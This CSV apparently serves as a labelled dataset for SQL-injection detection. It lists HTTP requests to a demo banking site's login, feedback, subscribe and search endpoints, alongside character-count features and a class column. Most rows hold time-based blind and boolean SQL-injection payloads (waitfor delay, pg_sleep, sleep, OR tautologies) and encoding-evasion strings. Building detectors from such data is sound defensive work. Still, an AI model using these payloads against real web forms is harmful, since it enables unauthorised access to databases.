method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,0,3,2
GET,/survey_questions.jsp?step=5dR98IIN';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,2
POST,/sendFeedback,"submit=Submit&cfile=1'""&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,2
GET,/index.jsp?content=efI1lsnv');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=KipYzD4J');select%20pg_sleep(6);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b869-869)&name=tmtqptlo&subject=1,0,0,0,1,0,0,2
GET,/search.jsp?query=%40%40rqivn,,0,0,0,0,0,0,2
GET,/feedback.jsp,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=3VpOm7sh&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=Mj3yP2Hj';%20waitfor%20delay%20'0:0:9'%20--%20&name=tmtqptlo&subject=1,3,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b393-393-1=0%2b0%2b0%2b1%20or%20'Qd3OvlVo'='&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,2
GET,/search.jsp?query=-1;select%20pg_sleep(9);%20--%20,,0,0,1,1,3,2,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b207-207-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b855-855-1=0%2b0%2b0%2b1%20--%20&uid=1,1,0,1,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%bf'%bf""&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/search.jsp?query=1,,0,0,0,0,0,0,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%f0''%f0""""",2,2,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2%252527%252522&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b658-658-1=0%2b0%2b0%2b1%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=%40%40mXQVG&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/images,,0,0,0,0,0,0,2
GET,/swagger,,0,0,0,0,0,0,2
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=5a5ylBxh');select%20pg_sleep(6);%20--%20,1,0,1,1,0,3,2
POST,/sendFeedback,submit=Submit&cfile=z9tWFEQO'));select%20pg_sleep(3);%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1,0,0,0,0,0,1,2
GET,/search.jsp?query=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=1'""&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=if(now()=sysdate()%2csleep(6)%2c0),,0,0,0,4,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=tCjexRoH';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,0,2,2
GET,/search.jsp?query=-1);%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,2
GET,/retirement.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z",0,2,0,5,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=-1""%20OR%202%2b677-677-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,1,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=%40%40ynFiz,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b558-558-1=0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1%20OR%202%2b551-551-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=la9qVR1W';select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=42g86ty3'));select%20pg_sleep(15);%20--%20&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'""&subject=1",1,1,0,0,0,0,2
GET,/login.jsp,,0,0,0,0,0,0,2
GET,/subscribe.jsp,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%20waitfor%20delay%20'0:0:6'%20--%20&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
GET,/index.jsp?content=%5c,,0,0,0,0,0,0,2
GET,/search.jsp?query=bwTJmpFn,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=p26oykm8'));select%20pg_sleep(9);%20--%20,1,0,1,1,0,3,2
GET,/index.jsp,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b483-483-1=0%2b0%2b0%2b1%20or%20'7MtIA4C0'=',4,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0''%f0""""&subject=1",2,2,0,0,0,0,2
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=NWkDosWa';select%20pg_sleep(3);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=if(now()=sysdate()%2csleep(9)%2c0)&name=tmtqptlo&subject=1,0,0,0,4,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%407tepu,0,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,0,3,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1acuYFWvoeUaBk&email_addr=sample%40email.tst&name=hrcbkxgn&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI=&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b658-658)%20or%20'AIdsYtEP'='&uid=1,4,0,0,1,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z,2,0,0,5,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=8jUj1Kzi'));select%20pg_sleep(9);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b420-420-1=0%2b0%2b0%2b1&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b458-458-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=DkIvryQd');select%20pg_sleep(6);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2%252527%252522&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b539-539-1=0%2b0%2b0%2b1%20--%20&name=tmtqptlo&subject=1,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b844-844-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b947-947-1=0%2b0%2b0%2b1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=1%20waitfor%20delay%20'0:0:6'%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
GET,/index.jsp?content=-1%20OR%202%2b854-854-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,9,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
GET,/search.jsp?query=nv1N3R4Y';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1acuieKEIaM5tx,0,0,0,0,0,1,2
GET,/search.jsp?query=-1%20OR%203%2b698-698-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b458-458-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b726-726-1=0%2b0%2b0%2b1,0,0,0,0,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b183-183-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=cqgijfvf&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b748-748-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,0,0,0,2
GET,/survey_questions.jsp?step=1acu4Zzgv44Vv5,,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=-1%20OR%202%2b11-11-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
GET,/util/serverStatusCheckService.jsp?HostName=%5c,,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=-1%20OR%202%2b617-617-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst'%20AND%202*3*8=6*8%20AND%20'5Rlm'='5Rlm&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/util,,0,0,0,0,0,0,2
GET,/index.jsp?content=personal_loans.htm'%20AND%202*3*8=6*8%20AND%20'guol'='guol,,4,0,0,0,4,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c,0,0,0,0,0,1,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'""%2b(select(0)from(select(sleep(9)))v)%2b""*/",2,2,0,15,0,9,2
GET,/util/serverStatusCheckService.jsp?HostName=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(9);%20--%20,0,0,1,1,0,3,2
POST,/doLogin,btnSubmit=Login&passw=1%00%c0%a7%c0%a2%252527%252522&uid=1,0,0,0,0,0,1,2
